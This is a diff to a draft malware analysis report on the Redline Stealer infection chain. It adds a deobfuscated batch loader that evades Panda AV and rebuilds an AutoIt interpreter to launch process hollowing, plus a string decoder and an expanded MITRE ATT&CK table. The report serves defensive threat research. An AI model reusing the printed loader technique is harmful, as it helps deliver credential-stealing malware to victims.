@@ -28,21 +28,46 @@ If you wish to support my work, you can buy me a coffee [here](buymeacoffee.com/
 - *Redline Stealer* exits if it detects the infected machine is from a near Russian countries.
 - *Redline Stealer* executes its modules in random order to potentially evade heuritic detection.
 
+PLACEHOLDER (Write single paragraph summary here)
+
 ## Infection Chain
 
-The infection chain starts with a download of `[BigTitsRoundAsses] 17.12.14 - Jazmyn [1080p].scr` from `pornleech[.]ch`, which creates three files in the `TEMP%` directory, `Che.mp3` (Autoit Interpreter), `Quella.mp3`, (BAT Script) and `Travolge.mp3` (AutoIT Script).
+The infection chain starts with a download of `[BigTitsRoundAsses] 17.12.14 - Jazmyn [1080p].scr` from `pornleech[.]ch`, which creates three files (Table placeholder).
+
+| Filepath              | Description          |
+| --------------------- | -------------------- |
+| `%TEMP%\Che.mp3`      | AutoIt Interpreter   |
+| `%TEMP%\Quella.mp3`   | Batch Script         |
+| `%TEMP%\Travolge.mp3` | AutoIt Loader Script | 
+
+*Table placeholder: Written Installer Files*
 
 ### Obfuscated BAT Script
 
-Once extracted, the installer executes `cmd /c cmd < Quella.mp3 & ping -n 5 localhost`, which later creates `Mantenga.exe.pif`, which is an AutoIT interpreter.
+Once extracted, the installer executes `cmd /c cmd < Quella.mp3 & ping -n 5 localhost`, which executes `tasklist` to identify if `PSUAService.exe` (PandaAV) is currently running. If the process is not running, it uses `autoit.exe` as the file name for the AutoIt interpreter. Otherwise, the AutoIt interpreter is named `Magenta.exe.pif`.
 
-PLACEHOLDER (FIGURE FOR DEOBFUSCATED THE BAT SCRIPT)
+Next, the magic bytes `MZ` is written to the start of the file to contain the AutoIt interpreter. Once written, the file `%TEMP%\Che.mp3` is filtered by `findstr` to exclude the string a string (Figure placeholder), which results in writing the rest of the AutoIt interperter to the `%TEMP%` directory as either `autoit.exe` or `Magenta.exe.pif`. Next, `%TEMP%\Travolge.mp3` is moved to the file `%TEMP%\i`, which is then executed with the AutoIt interpreter (Figure placeholder).
+
+```powershell
+Set AUTOIT=Mantenga.exe.pif
+tasklist /FI "imagename eq PSUAService.exe" 2>NUL | find /I /N "psuaservice.exe">NUL
+if not errorlevel 1 Set AUTOIT=autoit.exe
+<nul set /p = "MZ" > %AUTOIT%
+findstr /V /R "^diLJRRSZItYtjhNoXjwrIGvJMByETfIXXTtuIEKyNckyqsZonxjyqPIKKwXfLhuzcquzoGAzCVfhxsJcCXuneCXokxvGGxzAgSJZlF$" Che.mp3 >> %AUTOIT%
+Move Travolge.* i
+%AUTOIT% i
+ping localhost -n 5
+```
+Figure placeholder: Redline Stealer Deobfuscated Batch Script
 
 ### Obfuscated AutoIT Script
 
 Next, the AutoIT interpreter executes `i`.  Then the AutoIT script performs process hollowing, creates the process `jsc.exe` in suspended mode, hollows the process then injects the process with Redline Stealer.
 
-PLACEHOLDER (ADD FIGURE FOR AU3 DEOBFUSCATOR)
+```python
+def decode_string(string: str, key: int) -> str:
+    return ''.join([chr(int(c) - int(key)) for c in string.split('U')])
+```
 
 Installer → Quella.mp3 (BAT) → Mantenga.exe.pif (Loader) → jsc.exe
 
@@ -585,18 +610,23 @@ alert http $HOME_NET any -> $EXTERNAL_NET any (
 
 ## Mitre Attack TTPs
 
-| ID                                                          | Tactic               | Technique                                                |
-| ----------------------------------------------------------- | -------------------- | -------------------------------------------------------- |
-| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Execution            | Command and Scripting Interpreter: Windows Command Shell |
-| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Defense Evasion      | Process Injection: Process Hollowing                     |
-| [T1027](https://attack.mitre.org/techniques/T1027/)         | Defense Evasion      | Obfuscated Files or Information                          |
-| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Command and Control  | Application Layer Protocol: Web Protocols                |
-| [T1041](https://attack.mitre.org/techniques/T1041/)         | Exfiltration         | Exfiltration Over C2 Channel                             |
-| [T1020](https://attack.mitre.org/techniques/T1020/)         | Exfiltration         | Automated Exfiltration                                   |
-| [T1555](https://attack.mitre.org/techniques/T1555/)         | Credential Access    | Credentials from Password Stores                         |
-| [T1586.001](https://attack.mitre.org/techniques/T1586/001/) | Resource Development | Compromise Accounts: Social Media Accounts               |
-| [T1528](https://attack.mitre.org/techniques/T1528/)         | Credential Access    | Steal Application Access Token                           |
-| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Execution            | User Execution: Malicious File                           | 
+| ID                                                          | Tactic               | Technique                                                | Description                                                      |
+| ----------------------------------------------------------- | -------------------- | -------------------------------------------------------- | ---------------------------------------------------------------- |
+| [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Execution            | Command and Scripting Interpreter: Windows Command Shell | Redline Stealer Remote Tasks from C2 Server                      |
+| [T1204.002](https://attack.mitre.org/techniques/T1204/002/) | Execution            | User Execution: Malicious File                           | Redline Stealer Remote Tasks from C2 Server                      |
+| [T1055.012](https://attack.mitre.org/techniques/T1055/012/) | Defense Evasion      | Process Injection: Process Hollowing                     | AutoIt Loader                                                    |
+| [T1027](https://attack.mitre.org/techniques/T1027/)         | Defense Evasion      | Obfuscated Files or Information                          | Batch Loader, AutoIt Loader, Redline Stealer                     |
+| [T1071.001](https://attack.mitre.org/techniques/T1071/001/) | Command and Control  | Application Layer Protocol: Web Protocols                | Redline Stealer uses SOAP over TCP or HTTP                       |
+| [T1041](https://attack.mitre.org/techniques/T1041/)         | Exfiltration         | Exfiltration Over C2 Channel                             | Redline Stealer Exfiltration with SOAP Protocol over TCP or HTTP |
+| [T1020](https://attack.mitre.org/techniques/T1020/)         | Exfiltration         | Automated Exfiltration                                   | Redline Stealer Modules                                          |
+| [T1555](https://attack.mitre.org/techniques/T1555/)         | Credential Access    | Credentials from Password Stores                         | Redline Stealer Modules                                          |
+| [T1528](https://attack.mitre.org/techniques/T1528/)         | Credential Access    | Steal Application Access Token                           | Redline Stealer Modules                                          |
+| [T1586.001](https://attack.mitre.org/techniques/T1586/001/) | Resource Development | Compromise Accounts: Social Media Accounts               | Redline Stealer Modules                                          |
+| [T1036.007](https://attack.mitre.org/techniques/T1036/007/) | Masquerading         | Double File Extension                                    | AutoIT Interpreter `Mantenga.exe.pif`                            |
+| [T1539](https://attack.mitre.org/techniques/T1539/)         | Credential Access    | Steal Web Session Cookie                                 | Redline Stealer Browser Modules                                  |
+
+New TTP Process Discovery T1057
+New TTP System Network Configuration Discovery: Internet Connection Discovery T1016.001
 
 ## References
 - [AnyRun](https://app.any.run/tasks/b97bb9a0-7f20-4ead-8c38-d82640195779/)
@@ -604,3 +634,6 @@ alert http $HOME_NET any -> $EXTERNAL_NET any (
 ## Contributors
 - [dr4k0nia](https://twitter.com/dr4k0nia)
 - [AnFam17](https://twitter.com/AnFam17)
+- [whichbuffer](https://twitter.com/WhichbufferArda)
+- shellsilky
+- [grayhatter](https://gr.ht/)
